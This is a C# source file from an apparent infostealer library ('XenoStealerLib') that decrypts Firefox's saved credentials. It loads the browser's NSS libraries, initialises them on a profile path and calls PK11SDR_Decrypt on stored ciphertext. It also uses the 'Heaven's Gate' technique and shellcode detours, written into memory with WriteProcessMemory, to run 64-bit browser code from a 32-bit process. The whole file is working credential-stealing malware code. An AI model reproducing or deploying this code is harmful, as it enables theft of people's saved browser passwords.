using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace XenoStealerLib.Utils
{
    internal class FireFoxDecryptor
    {
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate long NSS_InitDelegate(string configdir);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate long NSS_ShutdownDelegate();

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate int PK11SDR_DecryptDelegate(ref TSECItem32 data, ref TSECItem32 result, int cx);

        [StructLayout(LayoutKind.Sequential)]
        public struct TSECItem64
        {
            public int SECItemType;
            public ulong SECItemData;
            public int SECItemLen;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct TSECItem32
        {
            public int SECItemType;
            public IntPtr SECItemData;
            public int SECItemLen;
        }


        private static HeavensGateProcessor HeavensGate;
        private static bool HeavensGateLoadError = false;
        private static string LastWorkingResourcePath = null;
        private ulong NSS3;
        private ulong MozGlue;

        private ulong PK11SDR_Decrypt64;
        private ulong NSS_Init64;
        private ulong NSS_Shutdown64;

        private IntPtr CurrentProcessHandle;

        private PK11SDR_DecryptDelegate PK11SDR_Decrypt;
        private NSS_InitDelegate NSS_Init;
        private NSS_ShutdownDelegate NSS_Shutdown;


        public bool Worked=false;
        public bool useHeavensGate=false;

        public FireFoxDecryptor(string GeckoResourcePath, bool UseLastWorkingResourcePathIfFail=true)
        {
            INIT(GeckoResourcePath, UseLastWorkingResourcePathIfFail);
        }

        private void INIT(string GeckoResourcePath, bool UseLastWorkingResourcePathIfFail) 
        {
            if (HeavensGate == null && !HeavensGateLoadError)
            {
                try
                {
                    HeavensGate = new HeavensGateProcessor();
                }
                catch
                {
                    HeavensGateLoadError = true;
                }
            }


            CurrentProcessHandle = NativeMethods.GetCurrentProcess();
            if (!NativeMethods.DuplicateHandle(CurrentProcessHandle, CurrentProcessHandle, CurrentProcessHandle, ref CurrentProcessHandle, 0, false, 2))
            {
                NativeMethods.CloseHandle(CurrentProcessHandle);
                throw new Exception("Could not duplicate process handle!");
            }

            if (!GeckoResourcePath.EndsWith("\\"))
            {
                GeckoResourcePath = GeckoResourcePath + "\\";
            }

            if (GeckoResourcePath.Contains("x86") && Environment.Is64BitProcess) // your a 64bit proc with a 32bit firefox, fail
            {
                Worked = false;
            }
            else if (!Environment.Is64BitProcess && !GeckoResourcePath.Contains("x86")) // your a 32bit process with a 64bit firefox, succeed
            {
                if (HeavensGate == null)
                {
                    Worked = false;
                }
                else
                {
                    useHeavensGate = true;
                    Worked = true;
                }
            }
            else 
            {
                Worked = true;
            }
            //else
            //your a 32 bit process with a 32 bit firefox, true
            //your a 64 bit process with a 64 bit firefox, true

            if (Worked && useHeavensGate)
            {
                MozGlue = LoadAndPatchMozGlue(GeckoResourcePath + "mozglue.dll");
                NSS3 = KernelLoadLibrary64(GeckoResourcePath + "nss3.dll");
            }
            else if (Worked)
            {
                MozGlue = (ulong)NativeMethods.LoadLibrary(GeckoResourcePath + "mozglue.dll");
                NSS3 = (ulong)NativeMethods.LoadLibrary(GeckoResourcePath + "nss3.dll");
            }
            else
            {
                MozGlue = 0;
                NSS3 = 0;
            }
            if (NSS3 != 0)
            {
                if (useHeavensGate)
                {
                    NSS_Init64 = HeavensGate.GetProcAddress64(NSS3, "NSS_Init");
                    NSS_Shutdown64 = HeavensGate.GetProcAddress64(NSS3, "NSS_Shutdown");
                    PK11SDR_Decrypt64 = HeavensGate.GetProcAddress64(NSS3, "PK11SDR_Decrypt");
                }
                else
                {

                    PK11SDR_Decrypt = (PK11SDR_DecryptDelegate)Marshal.GetDelegateForFunctionPointer(NativeMethods.GetProcAddress((IntPtr)NSS3, "PK11SDR_Decrypt"), typeof(PK11SDR_DecryptDelegate));
                    NSS_Init = (NSS_InitDelegate)Marshal.GetDelegateForFunctionPointer(NativeMethods.GetProcAddress((IntPtr)NSS3, "NSS_Init"), typeof(NSS_InitDelegate));
                    NSS_Shutdown = (NSS_ShutdownDelegate)Marshal.GetDelegateForFunctionPointer(NativeMethods.GetProcAddress((IntPtr)NSS3, "NSS_Shutdown"), typeof(NSS_ShutdownDelegate));
                }

                Worked = true;
            }
            if (Worked && LastWorkingResourcePath == null)
            {
                LastWorkingResourcePath = GeckoResourcePath;
            }
            if (!Worked)
            {
                if (LastWorkingResourcePath == GeckoResourcePath) 
                {
                    LastWorkingResourcePath = null;
                }
                NativeMethods.CloseHandle(CurrentProcessHandle);
            }

            if (!Worked && UseLastWorkingResourcePathIfFail && LastWorkingResourcePath!=null) 
            {
                INIT(LastWorkingResourcePath, false);
            }
        }


        private static bool NT_SUCCESS(int statusCode)
        {
            return statusCode != int.MaxValue && statusCode >= 0;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct UintResult
        {
            public uint Value;
        }

        public static bool KernelFreeLibrary64(ulong libraryAddr)
        {
            ulong kern = HeavensGate.LoadKernel32();
            ulong FreeLibraryAddr = HeavensGate.GetProcAddress64(kern, "FreeLibrary");

            if (FreeLibraryAddr == 0)
            {
                return false;
            }

            ulong[] FreeLibraryArgs = new ulong[] { libraryAddr };
            ulong loadedLibrary = HeavensGate.Execute64(FreeLibraryAddr, FreeLibraryArgs);
            return loadedLibrary==1;
        }

        public static ulong KernelLoadLibrary64(string libraryPath) 
        {
            ulong kern = HeavensGate.LoadKernel32();
            ulong LoadLibraryAddr = HeavensGate.GetProcAddress64(kern, "LoadLibraryA");

            if (LoadLibraryAddr == 0)
            {
                return 0;
            }

            IntPtr LoadStringAddr = Marshal.StringToHGlobalAnsi(libraryPath);
            ulong[] LoadLibraryArgs = new ulong[] { (ulong)LoadStringAddr };
            ulong loadedLibrary = HeavensGate.Execute64(LoadLibraryAddr, LoadLibraryArgs);
            Marshal.FreeHGlobal(LoadStringAddr);
            return loadedLibrary;
        }

        public bool DetourAddress(ulong AddressToReplace, ulong AddressToReplaceWith)
        {
            ulong kern = HeavensGate.LoadKernel32();

            if (kern == 0)
            {
                return false;
            }

            IntPtr hProcess = NativeMethods.GetCurrentProcess();

            if (!NativeMethods.DuplicateHandle(hProcess, hProcess, hProcess, ref hProcess, 0, false, 2))
            {
                NativeMethods.CloseHandle(hProcess);
                return false;
            }


            byte[] shellcode = new byte[]
            {
                0x48, 0xB8,                                     // MOV RAX, <Address>
                (byte)(AddressToReplaceWith & 0xFF),                    // Byte 1 of kernel32 function address
                (byte)((AddressToReplaceWith >> 8) & 0xFF),             // Byte 2 of kernel32 function address
                (byte)((AddressToReplaceWith >> 16) & 0xFF),            // Byte 3 of kernel32 function address
                (byte)((AddressToReplaceWith >> 24) & 0xFF),            // Byte 4 of kernel32 function address
                (byte)((AddressToReplaceWith >> 32) & 0xFF),            // Byte 5 of kernel32 function address
                (byte)((AddressToReplaceWith >> 40) & 0xFF),            // Byte 6 of kernel32 function address
                (byte)((AddressToReplaceWith >> 48) & 0xFF),            // Byte 7 of kernel32 function address
                (byte)((AddressToReplaceWith >> 56) & 0xFF),            // Byte 8 of kernel32 function address
                0xFF, 0xE0                                      // JMP RAX
            };

            ulong VirtualProtectEx = HeavensGate.GetProcAddress64(kern, "VirtualProtectEx");

            if (VirtualProtectEx == 0)
            {
                NativeMethods.CloseHandle(hProcess);
                return false;
            }

            ulong WriteProcessMemory = HeavensGate.GetProcAddress64(kern, "WriteProcessMemory");

            if (WriteProcessMemory == 0)
            {
                NativeMethods.CloseHandle(hProcess);
                return false;
            }

            UintResult oldProtectStruct = new UintResult();
            IntPtr oldProtectAddr = Marshal.AllocHGlobal(Marshal.SizeOf(oldProtectStruct));

            ulong[] args = new ulong[] { (ulong)hProcess, AddressToReplace, (ulong)shellcode.Length, 0x40, (ulong)oldProtectAddr };

            ulong execResult = HeavensGate.Execute64(VirtualProtectEx, args);

            uint oldProtect = Marshal.PtrToStructure<UintResult>(oldProtectAddr).Value;
            Marshal.FreeHGlobal(oldProtectAddr);

            if (!NT_SUCCESS((int)execResult))
            {
                NativeMethods.CloseHandle(hProcess);
                return false;
            }


            byte[] Buffer = shellcode;
            IntPtr BufferAddr = Marshal.AllocHGlobal(Buffer.Length);
            Marshal.Copy(Buffer, 0, BufferAddr, Buffer.Length);

            UintResult bytesWrittenStruct = new UintResult();

            IntPtr bytesWrittenAddr = Marshal.AllocHGlobal(Marshal.SizeOf(bytesWrittenStruct));

            args = new ulong[] { (ulong)hProcess, AddressToReplace, (ulong)BufferAddr, (ulong)Buffer.Length, (ulong)bytesWrittenAddr };

            execResult = HeavensGate.Execute64(WriteProcessMemory, args);

            if (!NT_SUCCESS((int)execResult))
            {
                NativeMethods.CloseHandle(hProcess);
                return false;
            }

            uint bytesWritten = Marshal.PtrToStructure<UintResult>(bytesWrittenAddr).Value;
            Marshal.FreeHGlobal(bytesWrittenAddr);

            oldProtectStruct = new UintResult();
            oldProtectAddr = Marshal.AllocHGlobal(Marshal.SizeOf(oldProtectStruct));

            args = new ulong[] { (ulong)hProcess, AddressToReplace, (ulong)shellcode.Length, oldProtect, (ulong)oldProtectAddr };

            execResult = HeavensGate.Execute64(VirtualProtectEx, args);

            Marshal.FreeHGlobal(oldProtectAddr);
            NativeMethods.CloseHandle(hProcess);
            if (!NT_SUCCESS((int)execResult))
            {
                return false;
            }
            return true;

        }
        public ulong LoadAndPatchMozGlue(string path)
        {
            string[] kernelPatchs = new string[] { "HeapAlloc", "HeapReAlloc", "HeapFree" };
            string[] msvcrtPatchs = new string[] { "_msize", "calloc", "free", "malloc", "realloc", "strdup" };
            Dictionary<string, string> DifferentMatchs = new Dictionary<string, string>();
            DifferentMatchs["strdup"] = "_strdup";
            
            ulong kern = HeavensGate.LoadKernel32();
            ulong msvcrt = HeavensGate.LoadLibrary64("msvcrt.dll");
            if (kern == 0 || msvcrt == 0)
            {
                return 0;
            }

            ulong LoadLibraryExAddr = HeavensGate.GetProcAddress64(kern, "LoadLibraryExA");

            if (LoadLibraryExAddr == 0)
            {
                return 0;
            }

            IntPtr LoadStringAddr = Marshal.StringToHGlobalAnsi(path);//"C:\\Program Files\\Mozilla Firefox\\mozglue.dll");
            ulong[] LoadLibraryExArgs = new ulong[] { (ulong)LoadStringAddr, 0, 0x00000001 }; //do not resolve
            ulong mozGlueLibrary = HeavensGate.Execute64(LoadLibraryExAddr, LoadLibraryExArgs);
            Marshal.FreeHGlobal(LoadStringAddr);
            if (mozGlueLibrary == 0)
            {
                return 0;
            }

            foreach (string i in msvcrtPatchs)
            {
                ulong MozFunctionAddress = HeavensGate.GetProcAddress64(mozGlueLibrary, i, out bool didGetFunction);

                if (!didGetFunction)
                {
                    return 0;
                }
                string RealFuncName = i;
                if (DifferentMatchs.ContainsKey(i))
                {
                    RealFuncName = DifferentMatchs[i];
                }
                ulong msvcrtFunctionAddress = HeavensGate.GetProcAddress64(msvcrt, RealFuncName, out didGetFunction);
                if (!didGetFunction)
                {
                    return 0;
                }
                bool DetourSucessfull = DetourAddress(MozFunctionAddress, msvcrtFunctionAddress);
                if (!DetourSucessfull)
                {
                    return 0;
                }
            }

            foreach (string i in kernelPatchs)
            {
                ulong MozFunctionAddress = HeavensGate.GetProcAddress64(mozGlueLibrary, i, out bool didGetFunction);
                if (!didGetFunction)
                {
                    return 0;
                }
                string RealFuncName = i;
                if (DifferentMatchs.ContainsKey(i))
                {
                    RealFuncName = DifferentMatchs[i];
                }

                ulong KernelFunctionAddress = HeavensGate.GetProcAddress64(kern, RealFuncName, out didGetFunction);
                if (!didGetFunction)
                {
                    return 0;
                }

                bool DetourSucessfull = DetourAddress(MozFunctionAddress, KernelFunctionAddress);
                if (!DetourSucessfull)
                {
                    return 0;
                }
            }

            return mozGlueLibrary;
        }
        public bool SetProfilePath(string ProfilePath) 
        {
            if (Worked) 
            {

                if (useHeavensGate) 
                {
                    IntPtr ProfilePathStringAddr = Marshal.StringToHGlobalAnsi(ProfilePath);
                    ulong Result = HeavensGate.Execute64(NSS_Init64, new ulong[] { (ulong)ProfilePathStringAddr });
                    Marshal.FreeHGlobal(ProfilePathStringAddr);
                    return Result == 0;
                }
                else 
                {
                    return NSS_Init(ProfilePath) == 0;
                }
                
            }
            return false;
        }

        public static bool IsValidGeckoResourcePath(string GeckoResourcePath) 
        {
            if (!GeckoResourcePath.EndsWith("\\"))
            {
                GeckoResourcePath = GeckoResourcePath + "\\";
            }
            return File.Exists(GeckoResourcePath + "nss3.dll") && File.Exists(GeckoResourcePath + "mozglue.dll");
        }

        public void Dispose() 
        {
            if (Worked) 
            {
                NativeMethods.CloseHandle(CurrentProcessHandle);
                if (useHeavensGate)
                {
                    HeavensGate.Execute64(NSS_Shutdown64, new ulong[] { });
                    KernelFreeLibrary64(NSS3);
                    KernelFreeLibrary64(MozGlue);
                }
                else 
                {
                    NSS_Shutdown();
                    NativeMethods.FreeLibrary((IntPtr)NSS3);
                    NativeMethods.FreeLibrary((IntPtr)MozGlue);
                }
            }

        }



        public string Decrypt(byte[] ffData)
        {
            if (ffData == null) return null;
            IntPtr ffDataUnmanagedPointer = IntPtr.Zero;
            try
            {

                ffDataUnmanagedPointer = Marshal.AllocHGlobal(ffData.Length);
                Marshal.Copy(ffData, 0, ffDataUnmanagedPointer, ffData.Length);
                if (useHeavensGate)
                {
                    TSECItem64 tSecDec = new TSECItem64();
                    TSECItem64 item = new TSECItem64();
                    item.SECItemType = 0;
                    item.SECItemData = (ulong)ffDataUnmanagedPointer;
                    item.SECItemLen = ffData.Length;
                    IntPtr itemAddr = Marshal.AllocHGlobal(Marshal.SizeOf(item));
                    IntPtr tSecDecAddr = Marshal.AllocHGlobal(Marshal.SizeOf(tSecDec));
                    Marshal.StructureToPtr(item, itemAddr, false);
                    Marshal.StructureToPtr(tSecDec, tSecDecAddr, false);

                    ulong[] PK11SDR_DecryptArgs = new ulong[] { (ulong)itemAddr, (ulong)tSecDecAddr, 0 };
                    if (HeavensGate.Execute64(PK11SDR_Decrypt64, PK11SDR_DecryptArgs) == 0) 
                    {
                        tSecDec = Marshal.PtrToStructure<TSECItem64>(tSecDecAddr);
                        item = Marshal.PtrToStructure<TSECItem64>(itemAddr);
                        if (tSecDec.SECItemLen != 0)
                        {
                            byte[] bvRet = new byte[tSecDec.SECItemLen];
                            IntPtr bvRetBuffer = Marshal.AllocHGlobal(tSecDec.SECItemLen);
                            ulong len = 0;

                            SpecialNativeMethods.NtWow64ReadVirtualMemory64(CurrentProcessHandle, tSecDec.SECItemData, bvRetBuffer, (ulong)tSecDec.SECItemLen, ref len);
                            Marshal.Copy(bvRetBuffer, bvRet, 0, tSecDec.SECItemLen);
                            Marshal.FreeHGlobal(bvRetBuffer);
                            return Encoding.ASCII.GetString(bvRet);
                        }
                        else
                        {
                            return "";
                        }

                    }


                    Marshal.FreeHGlobal(tSecDecAddr);
                    Marshal.FreeHGlobal(itemAddr);

                }
                else 
                {

                    TSECItem32 tSecDec = new TSECItem32();
                    TSECItem32 item = new TSECItem32();
                    item.SECItemType = 0;
                    item.SECItemData = ffDataUnmanagedPointer;
                    item.SECItemLen = ffData.Length;

                    if (PK11SDR_Decrypt(ref item, ref tSecDec, 0) == 0)
                    {
                        if (tSecDec.SECItemLen != 0)
                        {
                            byte[] bvRet = new byte[tSecDec.SECItemLen];
                            Marshal.Copy(tSecDec.SECItemData, bvRet, 0, tSecDec.SECItemLen);
                            return Encoding.ASCII.GetString(bvRet);
                        }
                        else
                        {
                            return "";
                        }
                    }
                }
            }
            catch
            {
                return null;
            }
            finally
            {
                if (ffDataUnmanagedPointer != IntPtr.Zero)
                {
                    Marshal.FreeHGlobal(ffDataUnmanagedPointer);

                }
            }
            return null;
        }
        public string Decrypt(string cypherText)
        {
            if (cypherText == null) return null;
            return Decrypt(Convert.FromBase64String(cypherText));
        }

    }
}
